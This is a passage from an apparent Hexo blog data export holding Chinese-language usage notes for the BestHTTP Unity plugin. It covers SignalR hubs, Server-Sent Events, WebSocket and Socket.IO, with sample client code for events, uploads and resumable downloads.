//可以通过索引或名称通过Connection对象访问Hub实例。\n        Hub hub = signalRConnection[0]; \n        Hub hub = signalRConnection[\"hubName\"]; \n\n        // 注册服务器可调用方法,要处理服务器可调用方法调用，我们必须调用集线器的On函数：\n        signalRConnection[\"hubName\"].On(\"joined\", Joined); \n        void Joined(Hub hub, MethodCallMessage msg) { Debug.log(string.Format(\"{0} joined at {1}\", msg.Arguments[0], msg.Arguments[1])); }\n```\nMethodCallMessage是服务器发送的对象，包含以下属性：\n>>>\n        Hub：包含方法必须调用的集线器名称的字符串。\n        Method：包含方法名称的字符串\n        Arguments：包含方法调用参数的对象数组。它可以是一个空数组。\n        State：包含其他自定义数据的字典\n>>>\n该插件将使用Hub和Method属性将消息路由到正确的集线器和事件处理程序。处理方法调用的函数只能使用Arguments和State属性。\n\n* 5:Call server-side methods \n调用服务器端方法可以通过调用Hub的Call函数来完成。调用函数重载以满足每个需求。 Call函数是非阻塞函数，它们不会阻塞，直到服务器发回有关该调用的任何消息。\n* 6:重载函数:\nCall（string method，params object [] args）：这可以用来以一种即发即弃的方式调用服务器端函数。我们不会收到有关方法调用成功或失败的任何消息。可以在没有任何'args'参数的情况下调用此函数来调用无参数方法\n```\n        //在没有任何参数的情况下调用服务器端函数\n        signalRConnection[\"hubName\"].Call(\"Ping\"); \n        //使用两个字符串参数调用服务器端函数：'param1'和'param2'\n        signalRConnection[\"hubName\"].Call(\"Message\", \"param1\", \"param2\"); \n```\nCall（string method ，OnMethodResultDelegate onResult，params object [] args）：此函数可以用作前一个函数，但是函数可以作为第二个参数传递，该参数将在成功调用服务器端函数时调用。\n```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone); \n        void OnGetValueDone(Hub hub, ClientMessage originalMessage, ResultMessage result) { Debug.Log(\"GetValue executed on the server. Return value of the function:\" + result.ReturnValue.ToString()); } \n```\n此回调函数接收调用此函数的Hub，发送到服务器的原始ClientMessage消息以及由于方法调用而由服务器发送的ResultMessage实例。 ResultMessage对象包含ReturnValue和State属性。               \n如果方法的返回类型为void，则ReturnValue为null.\nCall（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，params object [] args）：此函数可用于指定当方法无法在服务器上运行时将调用的回调。由于方法调用中存在未找到的方法，错误的参数或未处理的异常，因此可能会发生故障\n```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone, OnGetValueFailed); \n        void OnGetValueFailed(Hub hub, ClientMessage originalMessage, FailureMessage error) \n        { \n                Debug.Log(\"GetValue failed. Error message from the server: \" + error.ErrorMessage); \n        } \n```\n FailureMessage包含以下属性：\n >>>\n        ○ IsHubError：如果是Hub错误，则为True。 \n        ○ ErrorMessage：有关错误本身的简短消息。 \n        ○ StackTrace：如果在服务器上打开了详细的错误报告，则它包含错误的堆栈跟踪。\n        ○ AdditionalData：如果它不为null，则它包含有关错误的其他信息。\n >>>\n Call（string method，OnMethodResultDelegate onResult，OnMethodFailedDelegate onError，OnMethodProgressDelegate onProgress，params object [] args）：此函数可用于向服务器端方法调用添加其他进度消息处理程序。对于长时间运行的作业，服务器可以将进度消息发送到客户端。\n ```\n        signalRConnection[\"hubName\"].Call(\"GetValue\", OnGetValueDone, OnGetValueFailed, OnGetValueProgress); \n        void OnGetValueProgress(Hub hub, ClientMessage originalMessage, ProgressMessage progress) \n        { \n                Debug.Log(string.Format(\"GetValue progressed: {0}%\", progress.Progress)); \n        }\n ```\n 当插件收到ResultMessage或FailureMessage时，它不会为这些消息之后的ProgressMessages提供服务。\n\n * 7:使用Hub类作为继承的基类,Hub类可以用作封装集线器功能的基类。\n ```\n        class SampleHub : Hub \n        { \n                // 默认构造函数。每个集线器都必须有一个有效的名称. \n                public SampleHub() :base(\"SampleHub\") \n                { \n                        // 注册服务器可调用函数 \n                        base.On(\"ClientFunction\", ClientFunctionImplementation); \n                }\n                // 私有函数实现服务器可调用函数\n                private void ClientFunctionImplementation(Hub hub, MethodCallMessage msg) \n                { \n                // TODO: implement \n                } \n                // 包装函数调用服务器端函数.\n                public void ServerFunction(string argument) \n                { \n                        base.Call(\"ServerFunction\", argument); \n                } \n        }\n        //可以实例化此SampleHub并将其传递给Connection的构造函数：\n        SampleHub sampleHub = new SampleHub(); Connection signalRConnection = new Connection(Uri, sampleHub); \n\n ```\n\n * 8:Authentication\n Connection类具有AuthenticationProvider属性，可以将其设置为实现IAuthenticationProvider接口的对象,实现者必须实现以下属性和功能\n >>>\n        ● bool IsPreAuthRequired：如果在Connection类向服务器发出任何请求之前必须运行身份验证，则返回true的属性。示例：cookie身份验证器必须返回false，因为它必须发送用户凭据并接收必须随请求一起发送的cookie。 \n        ● StartAuthentication：仅在IsPreAuthRequired为true时才需要的函数。否则它不会被调用。 \n        ● PrepareRequest：使用请求和请求类型枚举调用的函数。此函数可用于在将请求发送到服务器之前准备。 \n        ● OnAuthenticationSucceded：IsPreAuthRequired为true且身份验证过程成功时必须调用的事件。 \n        ● OnAuthenticationFailed：IsPreAuthRequired为true且身份验证过程失败时必须调用的事件。\n >>>\n 一个非常简单的基于Header的身份验证器看起来像这样：\n ```\n        class HeaderAuthenticator : IAuthenticationProvider \n        { \n                public string User { get; private set; } \n                public string Roles { get; private set; } \n                // 此类身份验证不需要预先验证步骤\n                public bool IsPreAuthRequired { get { return false; } } \n                //未使用的事件，因为IsPreAuthRequired为false \n                public event OnAuthenticationSuccededDelegate OnAuthenticationSucceded; \n                //未使用的事件，因为IsPreAuthRequired为false\n                public event OnAuthenticationFailedDelegate OnAuthenticationFailed; \n                // 使用用户名和角色初始化身份验证器的构造函数.\n                public HeaderAuthenticator(string  user, string roles) \n                { \n                        this.User = user; this.Roles = roles; \n                } \n                //未使用的事件，因为IsPreAuthRequired为false             \n                public void StartAuthentication() { } \n                // 通过向其添加两个标头来准备请求\n                public void PrepareRequest(BestHTTP.HTTPRequest request, RequestTypes type) \n                { \n                        request.SetHeader(\"username\", this.User); request.SetHeader(\"roles\", this.Roles); \n                }\n        }\n ```\n 与Socket.IO的Manager类一样，SignalR的Connection类具有JsonEncoder属性，也可以设置静态Connection.DefaultEncoder。 JsonEncoder必须从BestHTTP.SignalR.JsonEncoders命名空间实现IJsonEncoder接口。该软件包包含一个LitJsonEncoder示例，也可用于某些示例\n\n ## Server-Sent Events\n\n* 1:Server-Sent Events是一种基于字符串的单向协议。数据来自服务器，没有选项可以向服务器发送任何内容。它是使用最新的草案实现的。虽然协议的名称是Server-Sent Events，但类本身名为EventSource,发生错误时，一旦发送LastEventId，插件将尝试重新连接，让服务器发送任何我们应该收到的缓冲消息\n```\n        //The EventSource class \n        //EventSource类位于BestHTTP.ServerSentEvents命名空间中：\n        using BestHTTP.ServerSentEvents; \n        var sse = new EventSource(new Uri(\"http://server.com\")); \n```\n* 2:Properties,这些是EventSource类的公开公开属性：\n>>>\n        ● Uri：这是协议尝试连接的端点。它是通过构造函数设置的。 \n        ● State：EventSource对象的当前状态。 \n        ● ReconnectionTime：等待尝试重新连接尝试的时间。它的默认值是2秒。 \n        ● LastEventId：最后收到的事件的id。如果没有收到任何事件ID，它将为null。 \n        ● InternalRequest：将在Open函数中发送的内部HTTPRequest对象。\n>>>\n\n* 3:事件\n```\n        //OnOpen：成功升级协议时调用它\n        eventSource.OnOpen += OnEventSourceOpened; \n        void OnEventSourceOpened(EventSource source) { Debug.log(\"EventSource Opened!\"); } \n\n        //OnMessage：当客户端从服务器收到新消息时调用它。此函数将接收一个Message对象，该对象包含Data属性中消息的有效内容。每次客户端收到消息时都会调用此事件，即使消息具有有效的事件名称，我们也为此事件分配了一个事件处理程序！\n        eventSource.OnMessage += OnEventSourceMessage;\n        void OnEventSourceMessage(EventSource source, Message msg) { Debug.log(\"Message: \" + msg.Data); }\n\n        // OnError：在连接到服务器或处理数据流时遇到错误时调用\n        eventSource.OnError += OnEventSourceError; \n        void OnEventSourceError(EventSource source, string error) { Debug.log(\"Error: \" + error); }\n\n        //OnRetry：在插件尝试重新连接到服务器之前调用此函数。如果函数返回false，则不会进行任何尝试，并且将关闭EventSource。\n        eventSource.OnRetry += OnEventSourceRetry; \n        bool OnEventSourceRetry(EventSource source) { // disable retry return false; }\n\n        //OnClosed：当EventSource关闭时，将调用此事件。\n        eventSource.OnClosed += OnEventSourceClosed; \n        void OnEventSourceClosed(EventSource source) { Debug.log(\"EventSource Closed!\"); } \n\n        //OnStateChanged：每次State属性更改时调用。\n        eventSource.OnStateChanged += OnEventSourceStateChanged; \n        void OnEventSourceStateChanged(EventSource source, States oldState, States newState) { Debug.log(string.Format(\"State Changed {0} => {1}\", oldSate, newState))); }\n```\n\n* 4:Functions,这些是EventSource对象的公共函数。\n```\n        //Open: 调用此函数，插件将开始连接到服务器并升级到Server-Sent Events协议。\n        EventSource eventSource = new EventSource(new Uri(\"http://server.com\")); \n        eventSource.Open(); \n\n        // On:使用此功能，客户端可以订阅事件\n        eventSource.On(\"userLogon\", OnUserLoggedIn); \n        void OnUserLoggedIn(EventSource source, Message msg) { Debug.log(msg.Data); }\n\n        //Off:它可用于取消订阅活动。\n        eventSource.Off(\"userLogon\"); \n\n        //Close: 此函数将开始关闭EventSource对象。\n        eventSource.Close(); \n```\n* 5:Message,Message类是一个逻辑单元，包含服务器可以发送的所有信息,Properties:\n>>>\n     ● Id：已发送事件的ID。如果没有发送id，则可以为null。它被插件使用。 \n     ● 事件：事件的名称。如果没有发送事件名称，则可以为null。 \n     ● 数据：消息的实际有效负载。 \n     ● 重试：服务器发送插件在重新连接尝试之前应等待的时间。它被插件使用。\n>>>\n\n## 简单例子\n● Upload a picture using forms \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.AddBinaryData(\"image\", texture.EncodeToPNG(), \"image.png\"); \n        request.Send(); \n```\n● Upload a picture without forms, sending only the raw data \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.SetHeader(\"Content-Type\", \"image/png\"); \n        request.Raw = texture.EncodeToPNG(); \n        request.Send(); \n```\n● Add custom header \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.SetHeader(\"Content-Type\", \"application/json; charset=UTF-8\"); \n        request.RawData = UTF8Encoding.GetBytes(ToJson(data)); \n        request.Send(); \n```\n● Display  download progress \n```\n        var request = new HTTPRequest(new Uri(\"http://serveroflargefile.net/path\"), (req, resp) => { Debug.Log(\"Finished!\"); }); \n        request.OnProgress += (req, down, length) => Debug.Log(string.Format(\"Progress: {0:P2}\", down / (float)length)); \n        request.Send(); \n```\n● Abort a request \n```\n        var request = new HTTPRequest(new Uri(address), (req, resp) => { // State should be HTTPRequestStates.Aborted if we call Abort() before // it’s finishes Debug.Log(req.State); }); \n        request.Send(); \n        request.Abort();\n```\n● 可恢复下载的范围请求,第一个请求是获取服务器功能的Head请求。当支持范围请求时，将调用DownloadCallback函数。在这个函数中，我们将创建一个新的实际请求来获取内容的块，并将回调函数设置为此函数。当前下载位置保存到PlayerPrefs，因此即使在应用程序重新启动后也可以恢复下载。\n```\n        private const int ChunkSize = 1024 * 1024; // 1 MiB - should be bigger! \n        private string saveTo = \"downloaded.bin\"; \n        void StartDownload(string url) \n        {\n        var headRequest = new HTTPRequest(new Uri(url), HTTPMethods.Head, (request, response) => \n        {\n                if (response == null) Debug.LogError(\"Response null. Server unreachable? Try again later.\"); \n                else {\n                        if (response.StatusCode == 416) Debug.LogError(\"Requested range not satisfiable\"); else if (response.StatusCode == 200) \n                        Debug.LogError(\"Partial content doesn't supported by the server, content can be downloaded as a whole.\"); \n                        else if (response.HasHeaderWithValue(\"accept-ranges\",\"none\")) Debug.LogError(\"Server doesn't supports the 'Range' header! The file can't be downloaded in parts.\"); \n                        else DownloadCallback(request, response);         \n                }\n        }  \n        // Range header for our head request \n        int startPos = PlayerPrefs.GetInt(\"LastDownloadPosition\",0); \n        headRequest.SetRangeHeader(startPos, startPos + ChunkSize); \n        headRequest.DisableCache = true; headRequest.Send(); \n        } \n\n        void DownloadCallback(HTTPRequest request, HTTPResponse response) \n        {\n                if (response == null) { Debug.LogError(\"Response null. Server unreachable, or connection lost? Try again later.\"); return; } var range = response.GetRange(); \n                if (range == null) { Debug.LogError(\"No 'Content-Range' header returned from the server!\"); return; } \n                else if (!range.IsValid) { Debug.LogError(\"No valid 'Content-Range' header returned from the server!\"); return; } \n                if (request.MethodType != HTTPMethods.Head) \n                { \n                        string path = Path.Combine(Application.temporaryCachePath,saveTo); \n                        using (FileStream fs = new FileStream(path, FileMode.Append)) fs.Write(response.Data, 0, response.Data.Length); \n                        PlayerPrefs.SetInt(\"LastDownloadPosition\", range.LastBytePos); \n                        Debug.LogWarning(string.Format(\"Download Status: {0}-{1}/{2}\", range.FirstBytePos, range.LastBytePos, range.ContentLength)); \n                        if (range.LastBytePos == range.ContentLength - 1) { Debug.LogWarning(\"Download finished!\"); return; } \n                }\n                var downloadRequest = new HTTPRequest(request.Uri, HTTPMethods.Get, /*isKeepAlive:*/ true, DownloadCallback); \n                int nextPos = 0; \n                if (request.MethodType != HTTPMethods.Head) nextPos = range.LastBytePos + 1; else nextPos = PlayerPrefs.GetInt(\"LastDownloadPosition\", 0);\n                downloadRequest.SetRangeHeader(nextPos, nextPos + ChunkSize); \n                downloadRequest.DisableCache = true;    \n                downloadRequest.Send(); \n        } \n\n```\n\n## 其他\n\n* 1:禁用功能\n>>>\n        ●BESTHTTP_DISABLE_COOKIES：使用此定义可以禁用所有与cookie相关的代码。不会进行cookie解析，保存和发送。 \n        ●BESTHTTP_DISABLE_CACHING：使用此定义可以禁用所有与缓存相关的代码。不会进行缓存或缓存验证。 \n        ●BESTHTTP_DISABLE_SERVERSENT_EVENTS：可以使用此功能禁用服务器发送的事件。 SignalR不会回退到此。 \n        ●BESTHTTP_DISABLE_WEBSOCKET：可以使用此禁用Websocket。 SignalR和Socket.IO不会使用此协议。 \n        ●BESTHTTP_DISABLE_SIGNALR：将禁用整个SignalR实施。 \n        ●BESTHTTP_DISABLE_SIGNALR_CORE：将禁用SignalR Core实施。 \n        ●BESTHTTP_DISABLE_SOCKETIO：将禁用整个Socket.IO实现。 \n        ●BESTHTTP_DISABLE_ALTERNATE_SSL：如果您没有为WebSocket使用HTTPS或WSS，或者您对默认实现感到满意，则可以禁用备用ssl处理程序。 \n        ●BESTHTTP_DISABLE_UNITY_FORM：您可以删除对Unity的WWWForm的依赖。\n>>>\n* 2:支持的平台\n>>>\n        ● WebGL\n        ● iOS\n        ● Android\n        ● Windows Phone 10\n        ● WinRT / Metro / Windows应用商店应用8.1,10•Windows，Linux和Mac独立版\n>>>\n* 3:在Android，iOS和桌面平台上.net的Net SslStream用于HTTPS。这可以处理各种证书，但有些证书可能会失败。要提供备用解决方案BouncyCastle捆绑在插件中，您可以通过在HTTPRequest对象上将UseAlternateSSL设置为true来使用它。但它也可能在一些认证上失败。在Windows Phone 8.1（及更高版本）和WinRT（Windows应用商店应用程序）上，安全的Tls 1.2协议将处理连接。\n\n","slug":"Unity/BestHttp/WebSocket","published":1,"updated":"2020-05-12T02:42:41.567Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8czy002p2gk747738olx","content":"<h1 id=\"WebSocket\"><a href=\"#WebSocket\" class=\"headerlink\" title=\"WebSocket\"></a>WebSocket</h1><h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><ul>\n<li><p>1:我们可以通过WebSocket类使用WebSocket功能。我们只需要将服务器的Uri传递给WebSocket的构造函数</p>\n</li>\n<li><p>2:创建</p>\n</li>\n</ul>\n<pre><code>        var webSocket = new WebSocket(new Uri(&quot;wss://html5labs-interop.cloudapp.net/echo&quot;)); \n</code></pre><ul>\n<li>3:,OnOpen事件：在建立与服务器的连接时调用。在此事件回调之后，WebSocket的IsOpen属性将为True，直到我们或服务器关闭连接或发生错误。</li>\n</ul>\n<pre><code>        webSocket.OnOpen += OnWebSocketOpen; \n        private void OnWebSocketOpen(WebSocket webSocket) { Debug.Log(&quot;WebSocket Open!&quot;); }</code></pre><ul>\n<li>4:,OnMessage事件：从服务器收到文本消息时调用。</li>\n</ul>\n<pre><code>        webSocket.OnMessage += OnMessageReceived; \n        private void OnMessageReceived(WebSocket webSocket, string message) { Debug.Log(&quot;Text Message received from server: &quot; + message); } \n</code></pre><ul>\n<li>5:,OnBinary事件：从服务器收到二进制blob消息时调用。</li>\n</ul>\n<pre><code>        webSocket.OnBinary += OnBinaryMessageReceived; \n        private void OnBinaryMessageReceived(WebSocket webSocket, byte[] message) { Debug.Log(&quot;Binary Message received from server. Length: &quot; + message.Length); }\n</code></pre><ul>\n<li>6:,OnClosed事件：在客户端或服务器关闭连接时调用，或发生内部错误。当客户端通过Close函数关闭连接时，它可以提供代码和消息，指示关闭的原因。服务器通常会回复我们的代码和消息。</li>\n</ul>\n<pre><code>        webSocket.OnClosed += OnWebSocketClosed; \n        private void OnWebSocketClosed(WebSocket webSocket, UInt16 code, string message) { Debug.Log(&quot;WebSocket Closed!&quot;);}\n</code></pre><ul>\n<li>7:OnError事件：当我们无法连接到服务器时调用，发生内部错误或连接丢失。第二个参数是Exception对象，但它可以为null。在这种情况下，检查WebSocket的InternalRequest应该告诉更多有关该问题的信息。</li>\n</ul>\n<pre><code>        webSocket.OnError += OnError; \n        private void OnError(WebSocket ws, Exception ex) \n        { \n                string errorMsg = string .Empty; \n                if (ws.InternalRequest.Response != null)\n                {\n                        errorMsg = string.Format(&quot;Status Code from Server: {0} and Message: {1}&quot;, ws.InternalRequest.Response.StatusCode, ws.InternalRequest.Response.Message); \n                }\n                Debug.Log(&quot;An error occured: &quot; + (ex != null ? ex.Message : &quot;Unknown: &quot; + errorMsg)); \n        } \n</code></pre><ul>\n<li>8:OnErrorDesc事件：一个更具信息性的事件，此事件在OnError事件之后调用,因为后者仅使用Exception参数调用。但它可以提供更详细的错误报告。</li>\n</ul>\n<pre><code>        webSocket.OnErrorDesc += OnErrorDesc; \n        void OnErrorDesc(WebSocket ws, string error) { Debug.Log(&quot;Error: &quot; + error); } \n</code></pre><ul>\n<li>9:在我们将所有事件注册完备之后，我们可以开始连接：</li>\n</ul>\n<pre><code>        webSocket.Open(); \n</code></pre><p>在此步骤之后，我们将收到一个OnOpen事件的回调，我们可以开始向服务器发送消息。</p>\n<pre><code>        // 发送字符串: \n        webSocket.Send(&quot;Message to the Server&quot;); \n\n        // 创建二进制流,并填充: \n        byte[] buffer = new byte[length]; \n        //发送二进制流 \n        webSocket.Send(buffer); \n</code></pre><p>完成通信后/不需要的时候,关闭链接,无法重用已关闭的WebSocket实例。</p>\n<pre><code>        webSocket.Close(); \n</code></pre><ul>\n<li>10:Ping消息：通过在收到OnOpen事件之前将StartPingThread属性设置为True，可以启动新线程将Ping消息发送到服务器。这样，Ping消息将定期发送到服务器。可以在PingFrequency属性中设置两次ping之间的延迟（默认值为1000ms）.(相当于设置心跳包)</li>\n<li>11:Pong消息：从插件服务器收到的所有ping消息将自动生成Pong应答。</li>\n<li>12:Streaming：较长的文本或二进制消息将变得支离破碎。默认情况下，这些片段由插件自动组装。如果我们向WebSocket的OnIncompleteFrame事件注册事件处理程序，则可以覆盖此机制。每次客户端收到不完整的片段时都会调用此事件。这些片段将被插件忽略，它不会尝试组装这些片段，也不会存储它们。此事件可用于实现流式传输体验。(自定义组装消息).</li>\n</ul>\n<h2 id=\"使用Socket-IO\"><a href=\"#使用Socket-IO\" class=\"headerlink\" title=\"使用Socket.IO\"></a>使用Socket.IO</h2><ul>\n<li>1:Socket.IO实现使用插件已有的功能。当轮询传输与其所有功能（cookie，连接重用等）一起使用时，它将发送HTTPRequests以获取握手数据，发送和接收数据包。 WebSocket实现用于WebSocket传输<blockquote>\n<blockquote>\n<blockquote>\n</blockquote>\n<pre><code>  1):易于使用和熟悉的api\n  2):兼容最新的Socket.IO规范\n  3):从轮询传输到websocket传输的无缝升级\n  4):断开时自动重新连接\n  5):简单高效的二进制数据发送和多种接收方式\n  6):在高级模式下使用它的强大工具（切换默认编码器，禁用自动解码等）</code></pre><blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</li>\n<li>2:使用.如果要连接到Socket.IO服务，可以使用BestHTTP.SocketIO.SocketManager类来完成。首先，您必须创建一个SocketManager实例</li>\n</ul>\n<pre><code>        using System; using BestHTTP; \n        using BestHTTP.SocketIO; \n        var manager = new SocketManager(new Uri(&quot;http://chat.socket.io/socket.io/&quot;)); </code></pre><ul>\n<li>3:Url中的/socket.io/路径非常重要，默认情况下，Socket.IO服务器将侦听此查询。所以不要忘记测试！</li>\n<li>4:Connecting to namespaces ,默认情况下，SocketManager将在连接到服务器时连接到根（“/”）命名空间。您可以通过SocketManager的Socket属性访问它：</li>\n</ul>\n<pre><code>        Socket root = manager.Socket; </code></pre><p>可以通过GetSocket（’/ nspName’）函数或通过manager的indexer属性访问非默认名称空间：</p>\n<pre><code>        Socket nsp = manager[&quot;/customNamespace&quot;]; \n        // 等价于: \n        Socket nsp = manager.GetSocket(&quot;/customNamespace&quot;); </code></pre><p>首次访问命名空间将启动内部连接过程</p>\n<ul>\n<li><p>4:Subscribing  and receiving events ,您可以订阅预定义和自定义事件。预定义事件是“连接”，“连接”，“事件”，“断开连接”，“重新连接”，“重新连接”，“重新连接”，“重新连接失败”，“错误”。(“connect”, “connecting”, “event”, “disconnect”, “reconnect”, “reconnecting”, “reconnect_attempt”, “reconnect_failed”, “error”. )自定义事件是程序员定义的事件，服务器将发送给您的客户端。您可以通过调用套接字的On函数来订阅事件：</p>\n<pre><code>      manager.Socket.On(&quot;login&quot;, OnLogin); \n      manager.Socket.On(&quot;new message&quot;, OnNewMessage); \n\n      void OnLogin(Socket socket, Packet packet, params object[] args) \n      { \n              //Socket参数将是服务器发送此事件的namespace-socket对象\n              //Packet参数包含事件的内部分组数据。数据包可用于访问服务器发送的二进制数据，或使用自定义Json解析器lib解码有效负载数据。稍后会详细介绍。\n              //Args参数是一个可变长度数组，包含来自数据包有效负载数据的解码对象。使用默认的Json编码器，这些参数可以是“原始”类型（int，double，string）或对象列表（List对象）或Dictionary字符串，对象对象。\n      } \n</code></pre></li>\n</ul>\n<pre><code></code></pre><pre><code>    //服务器上面的代码写法,在一个 node.js 的服务器上面\n    socket.emit(&#39;message&#39;, ‘MyNick’, ‘Msg to the client’); \n    //客户端接收\n    // subscribe to the &quot;message&quot; event \n    manager.Socket.On(&quot;message&quot;, OnMessage); \n    // event handler \n    void OnMessage(Socket socket, Packet packet, params object[] args) \n    { \n            // args[0] is the nick of the sender \n            // args[1] is the message \n            Debug.Log(string.Format(&quot;Message from {0}: {1}&quot;, args[0], args[1])); \n    } </code></pre><pre><code>&gt;&gt;&gt;\n        ●“connect”：命名空间打开时发送。 \n        ●“connecting”：当SocketManager开始连接到socket.io服务器时发送。 \n        ●“event”：在自定义（程序员定义的）事件上发送。 \n        ●“disconnect”：当传输断开，SocketManager关闭，Socket关闭或在握手数据中指定的给定时间内没有从服务器收到Pong消息时发送。 \n        ●“reconnect”：插件成功重新连接到socket.io服务器时发送。 \n        ●“reconnecting”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_attempt”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_failed”：重新连接尝试无法连接到服务器并且ReconnectAttempt达到选项“ReconnectionAttempts”值时发送。 \n        ●“error”：在服务器或内部插件错误上发送。事件的唯一参数是BestHTTP.SocketIO.Error对象。\n        ● Once：您可以订阅仅被调用一次的事件。manager.Socket.Once(&quot;connect&quot;, OnConnected); \n        ● Off:您可以删除所有活动订阅，或只删除一个\n        // 删除所有的回调事件\n        manager.Socket.Off(); \n        //从&quot;connect&quot;事件中删除所有回调\n        manager.Socket.Off(&quot;connect&quot;); \n        //从&quot;connect&quot;事件中删除OnConnected回调\n        manager.Socket.Off(&quot;connect&quot;, OnConnected); \n&gt;&gt;&gt;\n\n* 5:Sending events ,您可以使用“Emit”功能发送事件。您必须将事件名称作为第一个参数和可选的其他参数传递。这些将被编码为json并将被发送到服务器。您可以选择设置一个回调函数，该函数将在服务器处理事件时被调用（您必须正确设置服务器代码才能发回回调函数。有关更多信息，请参阅Socket.IO服务器端文档）。</code></pre><pre><code>    // 发送携带 2 个参数的事件给服务器\n    manager.Socket.Emit(&quot;message&quot;, &quot;userName&quot;, &quot;message&quot;); \n\n    // 发送携带 2 个参数的并有回调事件的事件给服务器\n    manager.Socket.Emit(&quot;custom event&quot;, OnAckCallback, &quot;param 1&quot;, &quot;param 2&quot;); \n    void OnAckCallback(Socket socket, Packet originalPacket, params object[] args) { Debug.Log(&quot;OnAckCallback!&quot;); } </code></pre><pre><code>您可以通过调用套接字的EmitAck函数向服务器发回确认。您必须传递原始数据包和任何可选数据,您可以保留对数据包的引用，并从其他位置调用EmitAck:</code></pre><pre><code>    manager[&quot;/customNamespace&quot;].On(&quot;customEvent&quot;, (socket, packet, args) =&gt; { socket.EmitAck(packet, &quot;Event&quot;, &quot;Received&quot;, &quot;Successfully&quot;); }); </code></pre><pre><code>* 6:发送二进制数据有 2 种方法\n1):通过传递给Emit函数，插件将扫描参数，如果找到参数，它将把它转换为二进制附件（如Socket.IO 1.0中所介绍的）。这是最有效的方法，因为它不会将字节数组转换为客户端的Base64编码字符串，并在服务器端转换为二进制。</code></pre><pre><code>    byte[] data = new byte[10]; \n    manager.Socket.Emit(&quot;eventWithBinary&quot;, &quot;textual param&quot;, data); </code></pre><pre><code>2):如果二进制数据作为字段或属性嵌入对象中，则Json编码器必须支持转换。默认的Json编码器无法将嵌入的二进制数据转换为Json，您必须使用更高级的Json解析器库（如&#39;JSON .NET For Unity&#39; - http://u3d.as/5q2）\n* 7:接收二进制数据\n在Socket.IO服务器中，当二进制数据发送到客户端时，它将用Json对象（{&#39;_ placeholder&#39;：true，&#39;num&#39;：xyz}）替换数据，并将二进制数据发送到另一个数据包中。在客户端，这些数据包将被收集并合并到一个数据包中。二进制数据将位于数据包的Attachments属性中。\n1):在这里你也可以选择使用这个数据包：\n在事件处理程序中，您可以通过数据包的Attachments属性访问所有二进制数据,autoDecodePayload默认为 true</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame); \n    void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); }</code></pre><pre><code>2):第二个选项与前一个选项几乎相同，略有改进：我们不会将发送的Json字符串解码为c＃对象。我们可以这样做，因为我们知道服务器只发送了二进制数据，此事件没有其他信息。因此，我们将让插件知道不解码有效负载</code></pre><pre><code>    //订阅“frame”事件，并将autoDecodePayload标志设置为false,不让插件自动解码\n    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); } </code></pre><pre><code>3):我们可以将&#39;{&#39;_placeholder&#39;：true，&#39;num&#39;：xyz}&#39;字符串替换为附件列表中附件的索引。</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) \n    { \n            //用索引替换Json对象\n            packet.ReconstructAttachmentAsIndex(); \n            // 现在，将Payload解码为 object[]\n            args = packet.Decode(socket.Manager.Encoder); \n            // args现在只包含一个索引号（可能为0） \n            byte[] data = packet.Attachments[Convert.ToInt32(args[0])]; texture.LoadImage(data); \n    } </code></pre><pre><code>4):我们可以用附件中转换为Base64编码字符串的二进制数据替换&#39;{&#39;_ placeholder&#39;：true，&#39;num&#39;：xyz}&#39;字符串。当高级Json解析器必须将其设置为对象的字段或属性时，它可以将其转换为字节数组</code></pre><pre><code>    Socket.On(&quot;frame&quot;, OnFrame, /*autoDecodePayload:*/ false); \n    void OnFrame(Socket socket, Packet packet, params object[] args) \n    { \n            // 用Base64编码的字符串替换Json对象 packet.ReconstructAttachmentAsBase64(); \n            // 现在，将Payload解码为object[]\n            args = packet.Decode(socket.Manager.Encoder); \n            // args现在包含一个Base64编码的字符串\n            byte[] data = Convert.FromBase64String(args[0] as string); texture.LoadImage(data); \n    }</code></pre><pre><code>* 8:设置默认的Json编码器, 您可以通过将SocketManager的静态DefaultEncoder设置为新的编码器来更改默认的Json编码器。在此步骤之后，所有新创建的SocketManager将使用此编码器。或者，您可以直接将SocketManager对象的Encoder属性设置为编码器。\n编写自定义Json编码器:如果由于各种原因想要更改默认的Json编码器，首先必须编写一个新的Json编码器。为此，您必须编写一个新类，该类从BestHTTP.SocketIO.JsonEncoders命名空间实现IJsonEncoder。剥离的IJsonEncoder非常小，你必须只实现两个功能：</code></pre><pre><code>    public interface IJsonEncoder \n    { \n            List&lt;object&gt; Decode(string json); \n            string Encode(List&lt;object&gt; obj); \n    } </code></pre><pre><code>Decode函数必须将给定的json字符串解码为对象列表。由于Socket.IO协议的性质，发送的json是一个数组，第一个元素是事件的名称。Encode函数用于编码客户端要发送给服务器的数据。此列表的结构与Decode相同：列表的第一个元素是事件的名称，任何其他元素是用户发送的参数。例子:</code></pre><pre><code>    using LitJson; \n    public sealed class LitJsonEncoder : IJsonEncoder \n    { \n            public List&lt;object&gt; Decode(string json) \n            { \n                    JsonReader reader = new JsonReader(json); \n                    return JsonMapper.ToObject&lt;List&lt;object&gt;&gt;(reader); \n            } \n            public string Encode(List&lt;object&gt; obj) \n            { \n                    JsonWriter writer = new JsonWriter(); \n                    JsonMapper.ToJson(obj, writer); \n                    return writer.ToString(); \n            } \n    } </code></pre><pre><code>\n* 